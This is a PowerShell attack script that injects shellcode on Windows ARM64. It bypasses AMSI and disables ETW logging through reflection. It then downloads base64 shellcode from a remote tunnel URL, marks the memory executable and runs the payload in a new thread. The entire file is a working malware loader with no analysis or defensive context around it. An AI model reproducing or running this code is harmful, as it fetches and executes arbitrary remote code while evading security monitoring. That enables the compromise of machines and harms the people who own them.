# ARM64 Compatible Shellcode Injection - Standard Win32 API
# Works on Windows ARM64 (no direct syscalls)

$u='https://concentrations-omaha-topic-hanging.trycloudflare.com/payloads/shellcode.txt?key=b45140e1b16ca05973c1fa308729c8fc'
[Net.ServicePointManager]::SecurityProtocol='Tls12'

Write-Host "[*] ARM64 Injection - Win32 API"

# AMSI Bypass (reflection-based, works on ARM64)
try {
    $a=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
    $f=$a.GetField('amsi'+'InitFailed','NonPublic,Static')
    $f.SetValue($null,$true)
    Write-Host "[+] AMSI bypassed"
} catch { Write-Host "[-] AMSI bypass failed: $_" }

# ETW Bypass
try {
    [Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null
    $etw=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    $etwField=$etw.GetField('etwProvider','NonPublic,Static')
    $etwField.SetValue($null,0)
    Write-Host "[+] ETW disabled"
} catch {}

# Download shellcode
Write-Host "[*] Downloading shellcode..."
try {
    $sc = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u))
    Write-Host "[+] Got $($sc.Length) bytes"
} catch {
    Write-Host "[-] Download failed: $_"
    return
}

# Check architecture
$arch = [Environment]::GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")
Write-Host "[*] Architecture: $arch"

if ($arch -eq "ARM64") {
    Write-Host "[!] WARNING: Shellcode must be ARM64 compiled!"
    Write-Host "[!] x64 shellcode will NOT work on ARM64 Windows"
}

# Simple self-injection using Marshal (most compatible)
Write-Host "[*] Self-injection via Marshal..."

try {
    # Allocate memory
    $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
    Write-Host "[+] Allocated at: 0x$($mem.ToString('X'))"
    
    # Copy shellcode
    [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
    Write-Host "[+] Shellcode copied"
    
    # Make executable using VirtualProtect
    $vp = @"
using System;
using System.Runtime.InteropServices;
public class VP {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@
    Add-Type $vp
    
    $oldProtect = 0
    $result = [VP]::VirtualProtect($mem, [UIntPtr]::new($sc.Length), 0x40, [ref]$oldProtect)
    if ($result) {
        Write-Host "[+] Memory marked RWX"
    } else {
        Write-Host "[-] VirtualProtect failed"
        return
    }
    
    # Create thread
    $tid = 0
    $th = [VP]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [ref]$tid)
    
    if ($th -ne [IntPtr]::Zero) {
        Write-Host "[+] Thread created: $tid"
        Write-Host "[*] Executing shellcode..."
        [VP]::WaitForSingleObject($th, 0xFFFFFFFF) | Out-Null
    } else {
        Write-Host "[-] CreateThread failed"
    }
    
} catch {
    Write-Host "[-] Injection failed: $_"
}
